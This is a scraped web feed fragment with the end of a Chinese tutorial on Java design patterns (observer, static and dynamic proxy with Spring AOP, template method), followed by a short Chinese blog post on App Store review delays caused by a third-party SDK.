<pre><code class="hljs language-sql" lang="sql">Alice received an <span class="hljs-keyword">update</span>: The <span class="hljs-keyword">current</span> stock price <span class="hljs-keyword">is</span> <span class="hljs-number">100.0</span>
Bob received an <span class="hljs-keyword">update</span>: The <span class="hljs-keyword">current</span> stock price <span class="hljs-keyword">is</span> <span class="hljs-number">100.0</span>
Charlie received an <span class="hljs-keyword">update</span>: The <span class="hljs-keyword">current</span> stock price <span class="hljs-keyword">is</span> <span class="hljs-number">100.0</span>
Alice received an <span class="hljs-keyword">update</span>: The <span class="hljs-keyword">current</span> stock price <span class="hljs-keyword">is</span> <span class="hljs-number">105.0</span>
Bob received an <span class="hljs-keyword">update</span>: The <span class="hljs-keyword">current</span> stock price <span class="hljs-keyword">is</span> <span class="hljs-number">105.0</span>
Charlie received an <span class="hljs-keyword">update</span>: The <span class="hljs-keyword">current</span> stock price <span class="hljs-keyword">is</span> <span class="hljs-number">105.0</span>
Alice received an <span class="hljs-keyword">update</span>: The <span class="hljs-keyword">current</span> stock price <span class="hljs-keyword">is</span> <span class="hljs-number">110.0</span>
Charlie received an <span class="hljs-keyword">update</span>: The <span class="hljs-keyword">current</span> stock price <span class="hljs-keyword">is</span> <span class="hljs-number">110.0</span>
</code></pre>
<p><strong>代码解释：</strong></p>
<ol>
<li>首先，创建一个 <code>Stock</code>对象作为主题。</li>
<li>创建多个 <code>Investor</code>对象作为观察者。</li>
<li>使用 <code>registerObserver</code>方法将这些投资者注册到 <code>Stock</code>对象。</li>
<li>当调用 <code>setPrice</code>方法更新股价时，所有注册的投资者会自动收到通知。</li>
<li>你可以使用 <code>removeObserver</code>方法移除不需要接收通知的投资者。</li>
</ol>
<h3 data-id="heading-22">JDK 中的应用：</h3>
<ul>
<li><code>java.util.Observer</code>和 <code>java.util.Observable</code></li>
<li><code>javax.swing.event.ChangeListener</code></li>
</ul>
<h3 data-id="heading-23">Spring 中的应用：</h3>
<ul>
<li><code>ApplicationEvent</code>和 <code>ApplicationListener</code>是典型的实现。</li>
</ul>
<h2 data-id="heading-24">6. 代理模式</h2>
<p>代理模式通过一个代理对象控制对目标对象的访问，常用于访问控制和日志记录等场景。此外，代理模式还包括静态代理和动态代理。</p>
<h3 data-id="heading-25">代码实现：静态代理</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 定义服务接口</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Service</span> {
    <span class="hljs-built_in">void</span> <span class="hljs-title function_">execute</span>();
}

<span class="hljs-comment">// 实现服务接口的真实服务类</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">RealService</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Service</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">execute</span>(<span class="hljs-params"/>) {
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"RealService is executing..."</span>);
    }
}

<span class="hljs-comment">// 代理服务类，持有真实服务对象的引用</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">ServiceProxy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Service</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">Service</span> realService;

    <span class="hljs-keyword">public</span> <span class="hljs-title class_">ServiceProxy</span>() {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">realService</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">RealService</span>();
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">execute</span>(<span class="hljs-params"/>) {
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"Additional operations before calling the real service, such as logging or permission checking"</span>);
        realService.<span class="hljs-title function_">execute</span>();
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"Additional operations after calling the real service, such as performance statistics"</span>);
    }
}


<span class="hljs-comment">// 测试静态代理</span>
<span class="hljs-keyword">public</span><span class="hljs-keyword">class</span> <span class="hljs-title class_">StaticProxyExample</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"><span class="hljs-built_in">String</span>[] args</span>) {
        <span class="hljs-title class_">Service</span> service = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServiceProxy</span>();
        <span class="hljs-comment">// 通过代理调用 execute 方法</span>
        service.<span class="hljs-title function_">execute</span>();
    }
}
</code></pre>
<p><strong>代码解释：</strong></p>
<ul>
<li><code>Service</code>接口：定义了服务的抽象方法 <code>execute</code>。</li>
<li><code>RealService</code>类：它是实现 <code>Service</code>接口的具体类，提供了服务的具体实现。</li>
<li><code>ServiceProxy</code>类：它是 <code>RealService</code>的代理类，也实现了 <code>Service</code>接口。在 <code>execute</code>方法中，除了调用真实服务的 <code>execute</code>方法外，还添加了前后额外的操作，实现了代理功能。</li>
<li>在 <code>StaticProxyExample</code>的 <code>main</code>方法中，创建一个 <code>ServiceProxy</code>对象并调用 <code>execute</code>方法，实现了对 <code>RealService</code>的代理调用。</li>
</ul>
<h3 data-id="heading-26">代码实现：动态代理</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> java.<span class="hljs-property">lang</span>.<span class="hljs-property">reflect</span>.<span class="hljs-property">InvocationHandler</span>;
<span class="hljs-keyword">import</span> java.<span class="hljs-property">lang</span>.<span class="hljs-property">reflect</span>.<span class="hljs-property">Method</span>;
<span class="hljs-keyword">import</span> java.<span class="hljs-property">lang</span>.<span class="hljs-property">reflect</span>.<span class="hljs-property">Proxy</span>;

<span class="hljs-comment">// 定义服务接口</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">DynamicService</span> {
    <span class="hljs-built_in">void</span> <span class="hljs-title function_">performTask</span>();
}

<span class="hljs-comment">// 实现服务接口的真实服务类</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">RealDynamicService</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">DynamicService</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">performTask</span>(<span class="hljs-params"/>) {
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"RealDynamicService is performing a task..."</span>);
    }
}

<span class="hljs-comment">// 动态代理调用处理器</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">DynamicServiceInvocationHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">InvocationHandler</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">Object</span> target;

    <span class="hljs-keyword">public</span> <span class="hljs-title class_">DynamicServiceInvocationHandler</span>(<span class="hljs-title class_">Object</span> target) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">target</span> = target;
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Object</span> <span class="hljs-title function_">invoke</span>(<span class="hljs-title class_">Object</span> proxy, <span class="hljs-title class_">Method</span> method, <span class="hljs-title class_">Object</span>[] args) throws <span class="hljs-title class_">Throwable</span> {
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"Additional operations before calling the real service, such as logging or permission checking."</span>);
        <span class="hljs-title class_">Object</span> result = method.<span class="hljs-title function_">invoke</span>(target, args);
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"Additional operations after calling the real service, such as performance statistics."</span>);
        <span class="hljs-keyword">return</span> result;
    }
}


<span class="hljs-comment">// 测试动态代理</span>
<span class="hljs-keyword">public</span><span class="hljs-keyword">class</span> <span class="hljs-title class_">DynamicProxyExample</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"><span class="hljs-built_in">String</span>[] args</span>) {
        <span class="hljs-title class_">RealDynamicService</span> realService = <span class="hljs-keyword">new</span> <span class="hljs-title class_">RealDynamicService</span>();
        <span class="hljs-comment">// 创建调用处理器并传入真实服务对象</span>
        <span class="hljs-title class_">DynamicServiceInvocationHandler</span> handler = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DynamicServiceInvocationHandler</span>(realService);
        <span class="hljs-comment">// 创建动态代理对象</span>
        <span class="hljs-title class_">DynamicService</span> proxyService = (<span class="hljs-title class_">DynamicService</span>) <span class="hljs-title class_">Proxy</span>.<span class="hljs-title function_">newProxyInstance</span>(
                <span class="hljs-title class_">DynamicService</span>.<span class="hljs-property">class</span>.<span class="hljs-title function_">getClassLoader</span>(),
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>&lt;?&gt;[]{<span class="hljs-title class_">DynamicService</span>.<span class="hljs-property">class</span>},
                handler);
        <span class="hljs-comment">// 通过代理调用 performTask 方法</span>
        proxyService.<span class="hljs-title function_">performTask</span>();
    }
}
</code></pre>
<p><strong>代码解释：</strong></p>
<ul>
<li><code>DynamicService</code>接口：定义了服务的抽象方法 <code>performTask</code>。</li>
<li><code>RealDynamicService</code>类：它是实现 <code>DynamicService</code>接口的具体类，提供了服务的具体实现。</li>
<li><code>DynamicServiceInvocationHandler</code>类：实现了 <code>InvocationHandler</code>接口，当代理对象的方法被调用时，其 <code>invoke</code>方法会被触发。在 <code>invoke</code>方法中，在调用真实服务方法前后添加了额外操作。</li>
<li>在 <code>DynamicProxyExample</code>的 <code>main</code>方法中，首先创建 <code>RealDynamicService</code>的实例，然后创建 <code>DynamicServiceInvocationHandler</code>实例并传入真实服务对象。接着使用 <code>Proxy.newProxyInstance</code>方法创建 <code>DynamicService</code>的代理对象，并调用 <code>performTask</code>方法，从而实现动态代理。</li>
</ul>
<h3 data-id="heading-27">真实源码中的应用</h3>
<p>在 Spring 框架中，AOP（面向切面编程）是代理模式的典型应用。Spring AOP 主要使用动态代理实现。当你使用 <code>@Aspect</code>注解定义一个切面，并使用 <code>@Before</code>、<code>@After</code>、<code>@Around</code>等注解定义通知时，Spring 会为受切面影响的 Bean 创建代理对象。</p>
<p>例如，你可能有一个服务类如下：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> org.<span class="hljs-property">springframework</span>.<span class="hljs-property">stereotype</span>.<span class="hljs-property">Service</span>;

<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserService</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">addUser</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> username</span>) {
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"Adding user: "</span> + username);
    }
}
</code></pre>
<p>你可以定义一个切面类如下：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">import</span> org.aspectj.lang.<span class="hljs-keyword">annotation</span>.Aspect;
<span class="hljs-keyword">import</span> org.aspectj.lang.<span class="hljs-keyword">annotation</span>.Before;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Component;

<span class="hljs-meta">@Aspect</span>
<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserServiceAspect</span> {
    <span class="hljs-meta">@Before(<span class="hljs-string">"execution(* com.example.service.UserService.addUser(..))"</span>)</span>
    <span class="hljs-keyword">public</span> void beforeAddUser() {
        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"Before adding user..."</span>);
    }
}
</code></pre>
<p><strong>代码解释：</strong></p>
<ul>
<li><code>UserService</code>是一个普通的服务类，包含 <code>addUser</code>方法。</li>
<li><code>UserServiceAspect</code>是一个切面类，使用 <code>@Before</code>注解定义了一个前置通知。当 <code>UserService</code>的 <code>addUser</code>方法被调用时，Spring 会为 <code>UserService</code>创建一个代理对象，并在调用 <code>addUser</code>方法之前执行 <code>beforeAddUser</code>方法。</li>
</ul>
<p>Spring 使用动态代理机制（如果是接口则使用 JDK 动态代理，否则使用 CGLIB 动态代理），在不修改 <code>UserService</code>类代码的情况下，将切面逻辑织入到 <code>UserService</code>的方法调用中，从而实现了横切关注点的分离。</p>
<h3 data-id="heading-28">总结</h3>
<ul>
<li>静态代理在编译时确定代理类和被代理类的关系，代码简单易懂，但如果接口方法较多，为每个方法添加代理逻辑会很繁琐。</li>
<li>动态代理通过反射机制在运行时生成代理对象，更加灵活，可以动态添加代理逻辑。适用于需要为多个不同的类或方法添加相同或相似代理逻辑的场景，如日志记录、性能统计、权限检查等。</li>
<li>Spring AOP 是动态代理在实际框架中的应用，它帮助开发者更好地实现面向切面编程，将横切关注点（如日志、事务、安全等）与业务逻辑分离，提高了代码的可维护性和可扩展性。</li>
</ul>
<h2 data-id="heading-29">7. 模板方法模式</h2>
<p>模板方法模式定义了一个算法的骨架，并将具体实现留给子类。</p>
<h3 data-id="heading-30">代码实现：制作饮料</h3>
<p>模拟制作咖啡和茶的过程。</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title">BeverageMaker</span> {
    <span class="hljs-comment">// 模板方法，定义制作饮料的算法骨架</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> final <span class="hljs-keyword">void</span> <span class="hljs-title">makeBeverage</span>()</span> {
        prepareIngredients();
        brew();
        pourInCup();
        addCondiments();
    }

    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title">prepareIngredients</span>()</span>;

    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title">brew</span>()</span>;

    <span class="hljs-comment">// 将饮料倒入杯中，有具体实现，可以被重写</span>
    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">pourInCup</span>()</span> {
        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"Pour the beverage into a cup"</span>);
    }

    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title">addCondiments</span>()</span>;
}

<span class="hljs-comment">// 具体子类 CoffeeMaker，用于制作咖啡</span>
<span class="hljs-keyword">class</span> <span class="hljs-title">CoffeeMaker</span> <span class="hljs-title">extends</span> <span class="hljs-title">BeverageMaker</span> {
    @Override
    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">prepareIngredients</span>()</span> {
        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"Prepare coffee beans and water"</span>);
    }

    @Override
    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">brew</span>()</span> {
        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"Brew coffee with a coffee machine"</span>);
    }

    @Override
    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">addCondiments</span>()</span> {
        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"Add sugar and milk"</span>);
    }
}

<span class="hljs-comment">// 具体子类 TeaMaker，用于制作茶</span>
<span class="hljs-keyword">class</span> <span class="hljs-title">TeaMaker</span> <span class="hljs-title">extends</span> <span class="hljs-title">BeverageMaker</span> {
    @Override
    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">prepareIngredients</span>()</span> {
        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"Prepare tea leaves and hot water"</span>);
    }

    @Override
    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">brew</span>()</span> {
        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"Brew tea with hot water"</span>);
    }

    @Override
    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">addCondiments</span>()</span> {
        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"Add lemon slices"</span>);
    }
}

<span class="hljs-comment">// 测试类</span>
publicclass TemplateMethodPatternDemo {
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span>(<span class="hljs-params">String[] args</span>)</span> {
        BeverageMaker coffeeMaker = <span class="hljs-keyword">new</span> CoffeeMaker();
        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"Making coffee:"</span>);
        coffeeMaker.makeBeverage();

        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"\n-----------------"</span>);

        BeverageMaker teaMaker = <span class="hljs-keyword">new</span> TeaMaker();
        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"Making tea:"</span>);
        teaMaker.makeBeverage();
    }
}
</code></pre>
<p><strong>代码解释：</strong></p>
<ul>
<li><code>BeverageMaker</code>是一个抽象类，其中 <code>makeBeverage</code>是一个模板方法。它定义了制作饮料的算法骨架，即先准备原料，然后冲泡，接着将饮料倒入杯中，最后添加调料。该方法是 <code>final</code>的，不允许子类修改这个流程的顺序。</li>
<li><code>prepareIngredients</code>、<code>brew</code>和 <code>addCondiments</code>是抽象方法。因为不同的饮料准备原料、冲泡和添加调料的方式不同，所以这些方法由具体的子类来实现。</li>
<li><code>pourInCup</code>方法是一个有默认实现的方法。对于大多数饮料来说，将饮料倒入杯中的操作是相似的，但如果子类有特殊需求，也可以重写该方法。</li>
<li><code>CoffeeMaker</code>和 <code>TeaMaker</code>是 <code>BeverageMaker</code>的具体子类。它们分别重写了 <code>prepareIngredients</code>、<code>brew</code>和 <code>addCondiments</code>方法，实现了制作咖啡和茶的具体步骤。</li>
<li>在 <code>TemplateMethodPatternDemo</code>的 <code>main</code>方法中，我们创建了 <code>CoffeeMaker</code>和 <code>TeaMaker</code>的实例，并调用它们的 <code>makeBeverage</code>方法。这样，我们可以看到，在不改变整体制作流程的情况下，不同的饮料可以按照自己的特点完成各个步骤。</li>
</ul>
<p>这个例子更贴近实际生活。它通过制作饮料的过程展示了模板方法模式如何分离算法的框架和具体实现，提高了代码的复用性和可维护性。对于不同的饮料，我们只需要关注它们各自的特点，而不需要重复实现整个制作流程，体现了模板方法模式的优势。</p>
<p>通过使用模板方法模式，我们可以在保证流程一致性的同时，根据具体情况灵活定制不同的步骤，使得代码更加清晰、易于扩展和维护。</p>
<h3 data-id="heading-31">JDK 中的应用：</h3>
<ul>
<li><code>java.util.AbstractList</code>和 <code>java.util.AbstractMap</code></li>
</ul>
<h3 data-id="heading-32">Spring 中的应用：</h3>
<ul>
<li><code>JdbcTemplate</code>和 <code>RestTemplate</code></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[最近一周AppStore卡审严重么？]]></title>    <link>https://juejin.cn/post/7602303923169902601</link>    <guid>https://juejin.cn/post/7602303923169902601</guid>    <pubDate>2026-02-03T05:55:25.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602303923169902601" data-draft-id="7602176198874824747" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="最近一周AppStore卡审严重么？"/> <meta itemprop="keywords" content="APP,Apple,uni-app"/> <meta itemprop="datePublished" content="2026-02-03T05:55:25.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="iOS研究院"/> <meta itemprop="url" content="https://juejin.cn/user/1421041942671774"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            最近一周AppStore卡审严重么？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1421041942671774/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    iOS研究院
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T05:55:25.000Z" title="Tue Feb 03 2026 05:55:25 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">背景</h2>
<p>AppStore卡审核一直是一个叫人捉摸不透的事情。</p>
<p>有些卡审其实并非偶尔，<code>而是历史发展的必然趋势</code>。</p>
<h3 data-id="heading-1">必然原因</h3>
<p>卡审的原因无非两点，自身有骚操作的业务流程。【审核触发2.3.1隐藏功能判定】</p>
<p>引用了不合规的第三方SDK，这里可能是第三方库组件，也可能是自己二次封装的私有仓库。</p>
<h3 data-id="heading-2">实例分析</h3>
<p>之前帮助一个团队解决隐藏功能触发的卡审问题，<strong>毫不避讳的说大厂的SDK也存在这种卡审的隐患</strong>。</p>
<p>简单来说，在App正常提交审核环节迭代过程中遭遇卡审，期间尝试过撤销重提，也尝试过加急审核。在加急审核的背景下，依然48小时才出结果。</p>
<p>经过几轮排查最终定位为某家大厂的美颜SDK，在移除美颜SDK后审核45分钟顺利通过审核。</p>
<p><strong>好消息过审了，坏消息8800元的SDK白买了。</strong></p>
<h3 data-id="heading-3">正常产品</h3>
<p>AppStore常规产品依然正常。我自己的产品均正常迭代审核。所以，干净的产品不用怕。🪆套娃的打法倒也正常。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/48b42b4e1a674c96926768657ed8e84e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgaU9T56CU56m26Zmi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770702925&amp;x-signature=VuSucJ0cME3kjYFsmBAkXvcdel4%3D" alt="222.png" loading="lazy"/></p>
<p>但是，这种卡审情况不排除周六日本身苹果也不审核导致的错觉。如果是上周五晚上提交，这两天出结果属于正常。<code>如果超过5天，那么基本上是卡审了，撤回重提依旧如此。那么可能要无了！</code></p>
<p><code>遵守规则，方得长治久安</code>，最后祝大家大吉大利，今晚过审！</p>
<h3 data-id="heading-4">相关推荐</h3>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FURmC_4vxQv5ttOg8yYe7Eg" target="_blank" title="https://mp.weixin.qq.com/s/URmC_4vxQv5ttOg8yYe7Eg" ref="nofollow noopener noreferrer"># 苹果开发者续费大坑及成功续费方案！亲测有效</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2F1bAA90Tzpx03tTHZbdg3aw" target="_blank" title="https://mp.weixin.qq.com/s/1bAA90Tzpx03tTHZbdg3aw" ref="nofollow noopener noreferrer"># AppStore敏感词排查手册，多维度分析Guideline 2.3.1隐藏功能，轻松过审。</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FV2F4BaEYh5HfeUUHm1tI6Q" target="_blank" title="https://mp.weixin.qq.com/s/V2F4BaEYh5HfeUUHm1tI6Q" ref="nofollow noopener noreferrer"># 如何主动提防苹果3.2f的进攻，自查防御手册（代码篇）</a></p>
